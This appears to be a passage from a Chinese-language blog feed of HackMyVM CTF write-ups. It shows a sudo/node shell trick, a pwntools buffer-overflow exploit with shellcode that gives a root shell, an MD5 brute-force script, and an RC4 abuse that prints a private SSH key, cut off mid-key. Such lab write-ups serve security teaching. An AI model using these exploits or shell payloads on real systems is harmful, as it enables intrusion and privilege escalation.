ghost@hell:/tmp$ <span class="token builtin class-name">echo</span> <span class="token string">'require("child_process").spawn("/bin/bash", &#123;stdio: [0, 1, 2]&#125;)'</span> <span class="token operator">></span> shell.js
ghost@hell:/tmp$ <span class="token function">chmod</span> +x shell.js
ghost@hell:/tmp$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> gato <span class="token function">node</span> /home/gato/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/tmp/shell.js
gato@hell:/tmp$ </code></pre>
<p>拿到gato权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gato@hell:~$ <span class="token function">cat</span> flag.txt 

█▀▀ ▄▀█ ▀█▀ █▀█ █▀▀ ▄▀█ █▀▄▀█ █▀▀ █▀█ ▄█ ▄█ █▀ █▀
█▄█ █▀█  █  █▄█ █▄█ █▀█ █ ▀ █ ██▄ █▀▄  █  █ ▄█ ▄█

Flag <span class="token number">10</span>: HELL<span class="token punctuation">&#123;</span>7H3_5UD03R5_15_N07_4_60D_1D34<span class="token punctuation">&#125;</span></code></pre>
<p>拿到第10个flag</p>
<h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash">gato@hell:~$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/opt/projects/strlen
/usr/bin/fusermount3
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/sudo
/usr/bin/mount
/usr/bin/gpasswd
/usr/libexec/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine</code></pre>
<p>有个strlen,看起来是求字符串长度</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gato@hell:/opt/projects$ ./strlen 

█▀ ▀█▀ █▀█ █   █▀▀ █▄ █
▄█  █  █▀▄ █▄▄ ██▄ █ ▀█

<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Usage: ./strlen <span class="token operator">&lt;</span>string<span class="token operator">></span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/17/ORzYqX.png" alt="ORzYqX.png" loading="lazy"><br>不会。<br>直接steal一手wp</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> a.py                       
<span class="token comment">#!/usr/bin/python2</span>
from pwn <span class="token function">import</span> *
 
offset <span class="token operator">=</span> <span class="token number">264</span>
shellcode  <span class="token operator">=</span> b<span class="token string">""</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"<span class="token entity" title="\x6a">\x6a</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\x58">\x58</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\xbb">\xbb</span><span class="token entity" title="\x2f">\x2f</span>"</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"<span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\x68">\x68</span><span class="token entity" title="\x53">\x53</span>"</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"<span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x57">\x57</span><span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x0f">\x0f</span><span class="token entity" title="\x05">\x05</span>"</span>
nop <span class="token operator">=</span> b<span class="token string">"<span class="token entity" title="\x90">\x90</span>"</span> * <span class="token punctuation">(</span>offset - len<span class="token punctuation">(</span>shellcode<span class="token punctuation">))</span>
rip <span class="token operator">=</span> b<span class="token string">"<span class="token entity" title="\x60">\x60</span><span class="token entity" title="\xe7">\xe7</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\x7f">\x7f</span>"</span>
 
print<span class="token punctuation">(</span>nop + shellcode + rip<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> python2 a.py <span class="token operator">></span>a.txt</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">gato@hell:/opt/projects$ ./strlen <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> a.txt<span class="token variable">)</span></span>

█▀ ▀█▀ █▀█ █   █▀▀ █▄ █
▄█  █  █▀▄ █▄▄ ██▄ █ ▀█

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> String: ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������j<span class="token punctuation">;</span>X�RH�//bin/shST_RWT^`����                                                                                                                                               
                                      
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Length: <span class="token number">270</span>                                                                                                                                                                                               
<span class="token comment"># id                                                                                                                                                                                                   </span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>gato<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>gato<span class="token punctuation">)</span>    </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># cd /root                                                                                                                                                                                                                                                   </span>
<span class="token comment"># ls                                                                                                                                                                                                                                                         </span>
containers  flag.txt                                                                                                                                                                                                                                         
<span class="token comment"># cat flag.txt                                                                                                                                                                                                                                               </span>
                                                                                                                                                                                                                                                             
█▀█ █▀█ █▀█ ▀█▀   █ █ █▀▀ █   █                                                                                                                                                                                                                              
█▀▄ █▄█ █▄█  █    █▀█ ██▄ █▄▄ █▄▄                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                             
Flag <span class="token number">11</span>: HELL<span class="token punctuation">&#123;</span>0V3RF10W_F0R_B3G1NN3R5<span class="token punctuation">&#125;</span>                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                             
Congratulations on completing this CTF<span class="token operator">!</span>    </code></pre>











]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
  </entry>
  <entry>
    <title>HackMyVM-Inkplot</title>
    <url>/posts/13e2841d/</url>
    <content><![CDATA[<p><strong>难度:medium</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.155</strong></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.155 -sV -A    </span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-18 <span class="token number">19</span>:19 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.155
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00064s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE   VERSION
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>       OpenSSH <span class="token number">9</span>.2p1 Debian <span class="token number">2</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">3000</span>/tcp <span class="token function">open</span>  websocket Ogar agar.io server
MAC Address: 08:00:27:4F:23:0D <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.64</span> ms <span class="token number">192.168</span>.56.155

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">13.53</span> seconds</code></pre>
<p>开放了22 3000两个端口,3000端口开了websocket服务,连接看看</p>
<h2 id="websocket"><a href="#websocket" class="headerlink" title="websocket"></a>websocket</h2><p>用websocat连接<br><em>安装websocat</em></p>
<blockquote>
<p>curl –proto ‘&#x3D;https’ –tlsv1.2 -sSf <a href="https://sh.rustup.rs/">https://sh.rustup.rs</a> | sh<br>source $HOME&#x2F;.cargo&#x2F;env<br>cargo install websocat</p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># websocat ws://192.168.56.155:3000/</span>
Welcome to our InkPlot secret IRC server
Bob: Alice, ready to knock our naive Leila off her digital pedestal?
Alice: Bob, I<span class="token string">'ve been dreaming about this for weeks. Leila has no idea what'</span>s about to hit her.
Bob: Exactly. We<span class="token string">'re gonna tear her defense system apart. She won'</span>t see it coming.
Alice: Poor Leila, always so confident. Let<span class="token string">'s do this.
Bob: Alice, I'</span>ll need that MD5 <span class="token builtin class-name">hash</span> to finish the job. Got it?
Alice: Yeah, I<span class="token string">'ve got it. Time to shake Leila'</span>s world.
Bob: Perfect. Release it.
Alice: Here it goes: d51540<span class="token punctuation">..</span>.
*Alice has disconnected*
Bob: What?<span class="token operator">!</span> Damn it, Alice?<span class="token operator">!</span> Not now<span class="token operator">!</span></code></pre>
<p>给了md的前几位<code>d51540</code><br>写个脚本爆破一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>

<span class="token comment"># rockyou.txt 字典文件路径</span>
<span class="token assign-left variable">rockyou_file</span><span class="token operator">=</span><span class="token string">"/usr/share/wordlists/rockyou.txt"</span>

<span class="token comment"># 检查 rockyou.txt 文件是否存在</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$rockyou_file</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"Error: <span class="token variable">$rockyou_file</span> not found."</span>
    <span class="token builtin class-name">exit</span> <span class="token number">1</span>
<span class="token keyword">fi</span>

<span class="token builtin class-name">echo</span> <span class="token string">"Searching for password..."</span>

<span class="token comment"># 读取rockyou.txt字典文件，逐行处理每个密码</span>
<span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> password<span class="token punctuation">;</span> <span class="token keyword">do</span>
    <span class="token comment"># 使用echo命令将密码传递给md5sum命令，然后提取md5sum的输出并取出哈希值部分</span>
    <span class="token assign-left variable">md5_hash</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$password</span>"</span> <span class="token operator">|</span> md5sum <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span><span class="token variable">)</span></span>
    <span class="token comment"># 显示当前处理的密码和哈希值</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"Processing password: <span class="token variable">$password</span> (MD5: <span class="token variable">$md5_hash</span>)"</span>
    <span class="token comment"># 检查MD5哈希值的前6位是否是d51540</span>
    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$&#123;md5_hash<span class="token operator">:</span>0<span class="token operator">:</span>6&#125;</span> <span class="token operator">==</span> <span class="token string">"d51540"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
        <span class="token builtin class-name">echo</span> <span class="token string">"Password found: <span class="token variable">$password</span>"</span>
        <span class="token builtin class-name">break</span>
    <span class="token keyword">fi</span>
<span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token string">"<span class="token variable">$rockyou_file</span>"</span>

<span class="token builtin class-name">echo</span> <span class="token string">"Done"</span></code></pre>
<p>爆破出来两个密码<code>palmira</code> <code>intelinside</code></p>
<h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><p>用用户名leila连接，测试发现密码是<code>intelinside</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh leila@192.168.56.155</span>
Auto-standby now activated after <span class="token number">2</span> min of inactivity
leila@192.168.56.155's password: 
Linux inkplot <span class="token number">6.1</span>.0-10-amd64 <span class="token comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.38-1 (2023-07-14) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
╭─leila@inkplot ~ 
╰─$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1003</span><span class="token punctuation">(</span>leila<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1003</span><span class="token punctuation">(</span>leila<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1003</span><span class="token punctuation">(</span>leila<span class="token punctuation">)</span>,100<span class="token punctuation">(</span>users<span class="token punctuation">)</span></code></pre>
<p>leila用户没有user flag,先看home</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">╭─leila@inkplot ~ 
╰─$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /home
total <span class="token number">16</span>
drwxr-xr-x  <span class="token number">4</span> root    root    <span class="token number">4096</span> Jul <span class="token number">28</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root    root    <span class="token number">4096</span> Jul <span class="token number">27</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
drwx---r-x  <span class="token number">5</span> leila   leila   <span class="token number">4096</span> Apr <span class="token number">18</span> <span class="token number">14</span>:47 leila
drwx---r-x  <span class="token number">5</span> pauline pauline <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span> pauline</code></pre>
<p>home下还有一个用户pauline</p>
<h3 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h3><pre class="language-bash" data-language="bash"><code class="language-bash">╭─leila@inkplot ~ 
╰─$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
sudo: unable to resolve <span class="token function">host</span> inkplot: Temporary failure <span class="token keyword">in</span> name resolution
Matching Defaults entries <span class="token keyword">for</span> leila on inkplot:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin, use_pty

User leila may run the following commands on inkplot:
    <span class="token punctuation">(</span>pauline <span class="token builtin class-name">:</span> pauline<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3 /home/pauline/cipher.py*</code></pre>
<p>发现有个py脚本可以用pauline用户执行</p>
<pre class="language-python" data-language="python"><code class="language-python">╭─leila@inkplot <span class="token operator">~</span> 
╰─$ cat <span class="token operator">/</span>home<span class="token operator">/</span>pauline<span class="token operator">/</span>cipher<span class="token punctuation">.</span>py<span class="token operator">*</span>        
<span class="token keyword">import</span> os
<span class="token keyword">import</span> json
<span class="token keyword">import</span> argparse
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> ARC4
<span class="token keyword">import</span> base64

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/home/pauline/keys.json'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    keys <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>

crypt_key <span class="token operator">=</span> keys<span class="token punctuation">[</span><span class="token string">'crypt_key'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encrypt_file</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        file_content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

    cipher <span class="token operator">=</span> ARC4<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    encrypted_content <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>file_content<span class="token punctuation">)</span>

    encoded_content <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encrypted_content<span class="token punctuation">)</span>

    base_filename <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>

    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>base_filename <span class="token operator">+</span> <span class="token string">'.enc'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>encoded_content<span class="token punctuation">)</span>

    <span class="token keyword">return</span> base_filename <span class="token operator">+</span> <span class="token string">'.enc'</span>

<span class="token keyword">def</span> <span class="token function">decrypt_file</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        encrypted_content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

    decoded_content <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>encrypted_content<span class="token punctuation">)</span>

    cipher <span class="token operator">=</span> ARC4<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    decrypted_content <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>decoded_content<span class="token punctuation">)</span>

    <span class="token keyword">return</span> decrypted_content

parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Encrypt or decrypt a file.'</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'filepath'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'The path to the file to encrypt or decrypt.'</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-e'</span><span class="token punctuation">,</span> <span class="token string">'--encrypt'</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Encrypt the file.'</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'--decrypt'</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Decrypt the file.'</span><span class="token punctuation">)</span>

args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> args<span class="token punctuation">.</span>encrypt<span class="token punctuation">:</span>
    encrypted_filepath <span class="token operator">=</span> encrypt_file<span class="token punctuation">(</span>args<span class="token punctuation">.</span>filepath<span class="token punctuation">,</span> crypt_key<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The encrypted and encoded content has been written to: "</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>encrypted_filepath<span class="token punctuation">)</span>
<span class="token keyword">elif</span> args<span class="token punctuation">.</span>decrypt<span class="token punctuation">:</span>
    decrypt_key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Please enter the decryption key: "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    decrypted_content <span class="token operator">=</span> decrypt_file<span class="token punctuation">(</span>args<span class="token punctuation">.</span>filepath<span class="token punctuation">,</span> decrypt_key<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The decrypted content is: "</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>decrypted_content<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Please provide an operation type. Use -e to encrypt or -d to decrypt."</span><span class="token punctuation">)</span></code></pre>
<p>是一个对文件进行加解密的脚本，密钥在<code>/home/pauline/keys.json</code>里面<br>加密方法是先进行RC4加密然后base64编码，然后存储在.enc文件里<br>RC4加密很简单,就是明文和密钥进行异或，如果对一个文件用同一密钥加密两次就会还原<br>可以利用这一点对pauline的ssh私钥加密两次获取明文,中间记得用base64解密</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">╭─leila@inkplot /home/pauline 
╰─$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> pauline /usr/bin/python3 /home/pauline/cipher.py <span class="token parameter variable">-e</span> /home/pauline/.ssh/id_rsa                                                                                                                                                         <span class="token number">1</span> ↵
sudo: unable to resolve <span class="token function">host</span> inkplot: Temporary failure <span class="token keyword">in</span> name resolution
The encrypted and encoded content has been written to: 
id_rsa.enc
╭─leila@inkplot /home/pauline 
╰─$ <span class="token function">cat</span> id_rsa.enc <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span> <span class="token operator">></span>/tmp/abc.enc
╭─leila@inkplot /home/pauline 
╰─$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> pauline /usr/bin/python3 /home/pauline/cipher.py <span class="token parameter variable">-e</span> /tmp/abc.enc             
sudo: unable to resolve <span class="token function">host</span> inkplot: Temporary failure <span class="token keyword">in</span> name resolution
The encrypted and encoded content has been written to: 
abc.enc.enc
╭─leila@inkplot /home/pauline 
╰─$ <span class="token function">cat</span> abc.enc.enc<span class="token operator">|</span> base64 <span class="token parameter variable">-d</span>              
-----BEGIN OPENSSH PRIVATE KEY-----
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
